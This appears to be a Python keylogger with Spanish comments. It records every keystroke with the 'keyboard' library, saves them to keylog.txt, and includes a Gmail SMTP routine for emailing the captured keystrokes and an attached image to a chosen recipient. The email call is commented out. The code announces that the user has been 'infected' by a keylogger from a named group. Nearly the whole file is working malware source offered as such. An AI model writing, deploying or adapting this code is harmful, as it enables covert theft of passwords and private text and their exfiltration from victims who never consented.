import keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.base import MIMEBase
from email import encoders



def enviar_correo_gmail(usuario, contrasena, destinatario, asunto, mensaje, imagen_adjunta=None):
    # Configuración del servidor SMTP de Gmail
    smtp_host = 'smtp.gmail.com'
    smtp_port = 587

    # Crear objeto de mensaje
    msg = MIMEMultipart()
    msg['From'] = usuario
    msg['To'] = destinatario
    msg['Subject'] = asunto

    # Agregar el cuerpo del mensaje
    msg.attach(MIMEText(mensaje, 'plain'))

        # Adjuntar imagen si se proporciona
    if imagen_adjunta:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(imagen_adjunta)
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename="captured_image.jpg"')
        msg.attach(part)   
    try:
        # Iniciar conexión SMTP
        server = smtplib.SMTP(smtp_host, smtp_port)
        server.starttls()

        # Autenticación
        server.login(usuario, contrasena)

        # Envío del correo electrónico
        server.send_message(msg)
        print('El correo electrónico ha sido enviado exitosamente.')

        # Cerrar conexión SMTP
        server.quit()
    except Exception as e:
        print('Ocurrió un error al enviar el correo electrónico:', str(e))

def capture_keystrokes():
    keystrokes = ""
    stop_key_combination = ["k"]
    sal = False
    while True:
        event = keyboard.read_event()
        
        # Verificar si se presiona la combinación para detener el keylogger
        if event.event_type == keyboard.KEY_DOWN and event.name == "w":
            while True:
                a = 0
                event2 = keyboard.read_event()
                if event2.event_type == keyboard.KEY_DOWN and event2.name == 'k':
                    print ("Keylogger detenido. Las pulsaciones se guardaron en keylog.txt")
                    sal = True
                    a = 1
                elif event2.event_type == keyboard.KEY_DOWN:
                    if event.name == "space":
                        keystrokes += " "
                        print("Espacio encontrado2.00")
                    else:
                        keystrokes += event.name
                        print("Letra encontrada2.0000")
                    a = 1
                if a == 1:
                    break
        if(sal == True):
            break
        if event.event_type == keyboard.KEY_DOWN:
            if event.name == "space":
                keystrokes += " "
                print("Espacio encontrado")
            else:
                keystrokes += event.name
                print("Letra encontrada")

    with open("keylog.txt", "w") as file:
        file.write(keystrokes)
        print("Keylogger detenido. Las USTED HA SIDO INFECTADO POR UN KEYLOGGER DESARROLLADO POR RADIATION WASCALS")
        # enviar_correo_gmail(CORREODELQUEENVIA,CONTRASEÑAESPECIAL, CORREODELDESTINATARIO, 'INFECTADO', keystrokes)

# def main():
#     try:
#         capture_keystrokes()
#     except Exception as e:
#         print(f"Ocurrió un error: {str(e)}")
#     finally:
#         print("Keylogger detenido.")

# main()



